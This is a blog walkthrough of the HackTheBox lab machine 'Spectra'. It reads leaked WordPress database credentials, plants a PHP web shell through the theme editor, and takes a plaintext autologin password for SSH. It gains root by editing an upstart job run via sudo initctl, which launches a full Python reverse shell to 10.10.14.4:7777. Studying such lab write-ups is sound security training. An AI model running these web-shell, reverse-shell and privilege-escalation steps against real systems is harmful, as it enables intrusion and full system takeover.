---
layout: post
title: "HTB: Spectra"
box: spectra
img: /img/spectra/spectra
author: Andrew Cherney
date: 2024-08-16
tags: htb easy-box chrome-os webapp wordpress sudo 
icon: "assets/icons/spectra.png"
post_description: "The last old box I had to rehack and create a writeup for due to the lack of documentation. Starts basic with a test site hosting wordpress files containing wp-fonfig.php leaking the database credentials. Those credentials double as the administrator password for the wordpress site which through a template edit gives us a shell as nginx. An insecure autologin script uses a hard coded password input giving an SSH session as katie. Sudo is the last step after editing a service we have access to then running the service with sudo to achieve rce and a root shell."
---

# Summary

{{ page.post_description }}

# Enumeration


```bash
nmap -p- 10.10.10.229

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql


nmap -p22,80,3306 -sCV 10.10.10.229

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.17.4
3306/tcp open  mysql   MySQL (unauthorized)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)2024-08-162024-08-162024-08-16
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
```

## Port 80

{% include img_link src="/img/spectra/spectra_front_page" alt="front_page" ext="png" trunc=600 %}

Has two links, one leading to http://spectra.htb/main/index.php and the other to http://spectra.htb/testing/index.php.

{% include img_link src="/img/spectra/spectra_80_wordpress" alt="wordpress front page" ext="png" trunc=600 %}

Simple wordpress site with no posts or activity. Could be useful if I can get credentials.



# User as katie

## Shell was nginx

![testing index php]({{ page.img }}_database_error.png)

Odd this must be connecting to the mysql service but is unable to auth. We'll toss a scan to see what else is at this endpoint.

```bash
dirsearch -u http://spectra.htb/testing

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Misc/Spectra/reports/http_spectra.htb/_testing_24-08-16_18-12-35.txt

Target: http://spectra.htb/

[18:12:35] Starting: testing/
[18:13:29] 500 -    3KB - /testing/index.php
[18:13:33] 200 -   19KB - /testing/license.txt
[18:13:52] 200 -    7KB - /testing/readme.html
[18:14:12] 200 -   11KB - /testing/wp-admin/
[18:14:12] 200 -  710B  - /testing/wp-admin/admin-ajax.php
[18:14:12] 500 -    3KB - /testing/wp-config.php
[18:14:12] 301 -  169B  - /testing/wp-admin  ->  http://spectra.htb/testing/wp-admin/
[18:14:12] 500 -    3KB - /testing/wp-admin/install.php
[18:14:12] 200 -    3KB - /testing/wp-config.php.save
[18:14:12] 200 -  627B  - /testing/wp-content/
[18:14:12] 301 -  169B  - /testing/wp-content  ->  http://spectra.htb/testing/wp-content/
[18:14:12] 200 -   69B  - /testing/wp-content/plugins/akismet/akismet.php
[18:14:12] 200 -  167B  - /testing/wp-content/plugins/hello.php
[18:14:12] 500 -    3KB - /testing/wp-admin/setup-config.php
[18:14:13] 301 -  169B  - /testing/wp-includes  ->  http://spectra.htb/testing/wp-includes/
[18:14:13] 200 -  173B  - /testing/wp-includes/rss-functions.php
[18:14:13] 200 -   25KB - /testing/wp-includes/
[18:14:13] 500 -    3KB - /testing/wp-signup.php
[18:14:13] 500 -    3KB - /testing/wp-cron.php
[18:14:13] 500 -    3KB - /testing/wp-login.php
[18:14:13] 200 -    0B  - /testing/xmlrpc.php
```

Without a running webapp to render these pages I can view and download any file from this wordpress testing site. Namely the **/testing/wp-config.php.save** is what I have my eyes set on but I do look around regardless.

![wp admin listing]({{ page.img }}_wpadmin_listing.png)

Nothing else here to check, onto the config file:

```bash
curl http://spectra.htb/testing/wp-config.php.save
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

...
```

Credentials for the database. I toss them at wordpress for no results under the username devtest. administrator:devteam1 however does let me into the wordpress admin dashboard. From here the simplest shell is to edit the 404.php template for a theme and navigate to it. I navigate to **http://spectra.htb/main/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen** and add a revshell php cmd payload. 

![404 upload php cmd]({{ page.img }}_404_php.png)

Then navigate to **http://spectra.htb/main/wp-content/themes/twentynineteen/404.php?cmd=id**

![404 php cmd id]({{ page.img }}_404_cmd.png)

For simplicity's sake I'll add a pentestmonkey shell so it's a little more stable than a bash revshell I would otherwise run here. After modifying 404.php head to **http://spectra.htb/main/wp-content/themes/twentynineteen/404.php** and pop the shell.

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.10.229 34802
Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7763 64-Core Processor AuthenticAMD GNU/Linux
 16:46:36 up 46 min,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
bash: cannot set terminal process group (4533): Inappropriate ioctl for device
bash: no job control in this shell
nginx@spectra / $
```


## /etc/autologin

The OS is not linux or windows as per HTB, I should check what it is by reading **/etc/lsb-release** (if it exists).

```bash
nginx@spectra / $ cat /etc/lsb-release
cat /etc/lsb-release
GOOGLE_RELEASE=87.3.41
CHROMEOS_RELEASE_BRANCH_NUMBER=85
CHROMEOS_RELEASE_TRACK=stable-channel
CHROMEOS_RELEASE_KEYSET=devkeys
CHROMEOS_RELEASE_NAME=Chromium OS
CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update
CHROMEOS_RELEASE_BOARD=chromeover64
CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/
CHROMEOS_RELEASE_BUILD_NUMBER=13505
CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1}
CHROMEOS_RELEASE_CHROME_MILESTONE=87
CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352
CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware
CHROMEOS_RELEASE_VERSION=87.3.41
CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64
```

I'm not sure this changes the gameplan here. I'll continue until an issue potentially relating to running on ChromeOS comes up. 

In my rounds for anything out of the ordinary there is a script in /opt which seems to auto login users.

```bash
nginx@spectra / $ ls -l /opt
ls -l /opt
total 36
drwxr-xr-x 2 root root 4096 Jun 28  2020 VirtualBox
-rw-r--r-- 1 root root  978 Feb  3  2021 autologin.conf.orig
drwxr-xr-x 2 root root 4096 Jan 15  2021 broadcom
drwxr-xr-x 2 root root 4096 Jan 15  2021 displaylink
drwxr-xr-x 2 root root 4096 Jan 15  2021 eeti
drwxr-xr-x 5 root root 4096 Jan 15  2021 google
drwxr-xr-x 6 root root 4096 Feb  2  2021 neverware
drwxr-xr-x 5 root root 4096 Jan 15  2021 tpm1
drwxr-xr-x 5 root root 4096 Jan 15  2021 tpm2
nginx@spectra / $ cat /opt/autologin.conf.orig
cat /opt/autologin.conf.orig
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
```

This uses passwords placed within **/etc/autologin/passwd** to perform the login and injects the keys with a python script.

```bash
find / -name "autologin.conf" 2>/dev/null
/etc/init/autologin.conf
nginx@spectra / $ cat /etc/autologin/passwd
cat /etc/autologin/passwd
SummerHereWeCome!!
```

```bash
ssh katie@spectra.htb

The authenticity of host 'spectra.htb (10.10.10.229)' can't be established.
RSA key fingerprint is SHA256:lr0h4CP6ugF2C5Yb0HuPxti8gsG+3UY5/wKjhnjGzLs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'spectra.htb,10.10.10.229' (RSA) to the list of known hosts.
Password: 
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
katie@spectra ~ $ cat user.txt
e89d27fe195---------------------
```

# Root

## sudo /sbin/initctl

As seen from the sudo -l check I can run a service starter as root. Services I am able to interact with are within /etc/init, so I decide to first check my groups then scan for any service I can write to.

```bash
katie@spectra ~ $ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
katie@spectra ~ $ ls -l /etc/init | grep developers
-rw-rw---- 1 root developers  478 Jun 29  2020 test.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test1.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test10.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test2.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test3.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test4.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test5.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test6.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test7.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test8.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test9.conf
katie@spectra ~ $ 
```

Simple enough I'll add a /bin/bash copier + SUID maker to test.conf then run the service and get root.

```bash
katie@spectra ~ $ nano /etc/init/test.conf
Error in /usr/local/etc/nanorc on line 260: Error expanding /usr/share/nano/*.nanorc: No such file or directory
katie@spectra ~ $ cat /etc/init/test.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    cp /bin/bash /tmp/bash
    chmod u+s /tmp/bash
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```

```bash
katie@spectra ~ $ sudo /sbin/initctl start test
test start/running, process 5777
katie@spectra ~ $ ls /tmp
bash                                   disk-post-startup            uptime-lockbox-cache-start
disk-boot-complete                     disk-pre-startup             uptime-login-prompt-visible
disk-chrome-exec                       disk-shill-start             uptime-network-ethernet-configuration
disk-chrome-main                       disk-ui-post-stop            uptime-network-ethernet-no-connectivity
disk-cryptohome-unmounted              f                            uptime-network-ethernet-ready
disk-lockbox-cache-end                 firmware-boot-time           uptime-network-ethernet-registered
disk-lockbox-cache-start               mysql.sock                   uptime-other-processes-terminated
disk-login-prompt-visible              mysql.sock.lock              uptime-post-startup
disk-network-ethernet-configuration    uptime-boot-complete         uptime-pre-startup
disk-network-ethernet-no-connectivity  uptime-chrome-exec           uptime-shill-start
disk-network-ethernet-ready            uptime-chrome-main           uptime-ui-post-stop
disk-network-ethernet-registered       uptime-cryptohome-unmounted
disk-other-processes-terminated        uptime-lockbox-cache-end
katie@spectra ~ $ /tmp/bash -p
-bash: /tmp/bash: Permission denied
katie@spectra ~ $ 
```

That is unexpected... Oh well onto a simple python revshell for a root shell. Be sure to stop the service before editing the file.


```bash
katie@spectra ~ $ sudo /sbin/initctl stop test
test stop/waiting
katie@spectra ~ $ nano /etc/init/test.conf
Error in /usr/local/etc/nanorc on line 260: Error expanding /usr/share/nano/*.nanorc: No such file or directory
katie@spectra ~ $ cat /etc/init/test.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
katie@spectra ~ $ sudo /sbin/initctl start test
test start/running, process 5908
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.10.229 34810
spectra / # id
id
uid=0(root) gid=0(root) groups=0(root)
spectra / # cat /root/root.txt
cat /root/root.txt
d44519713b88--------------------
```

